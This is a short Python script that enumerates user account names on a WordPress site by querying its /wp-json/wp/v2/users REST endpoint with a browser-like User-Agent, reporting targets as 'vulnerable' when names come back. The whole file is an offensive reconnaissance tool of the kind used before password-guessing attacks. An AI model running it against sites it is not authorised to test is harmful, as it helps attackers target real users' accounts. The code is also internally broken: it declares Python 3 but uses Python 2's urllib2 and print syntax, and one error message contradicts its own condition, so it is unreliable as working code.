#!/usr/bin/python3
import os,sys,re
import urllib2,json
domain = sys.argv[1]
print ('enumrating Account Info for', (domain))
sub_url = ('/wp-json/wp/v2/users')
url = (domain)+(sub_url)

try:
    opener = urllib2.build_opener()
    opener.addheaders = [('User-Agent', 'Mozilla/5.0')]
    response = opener.open(url)
    f = response.read()
    account = json.loads(f)
    for enum in account:
                 print(enum['name'])
except IndexError:
    print "Opps..! URL is provided.."
except urllib2.HTTPError:
    print "Opps..! URL is not vulnerable.."
except ValueError :
    print "Opps..! URL is not vulnerable.."

except urllib2.URLError:
    print "Opps..! I am not reachable.."

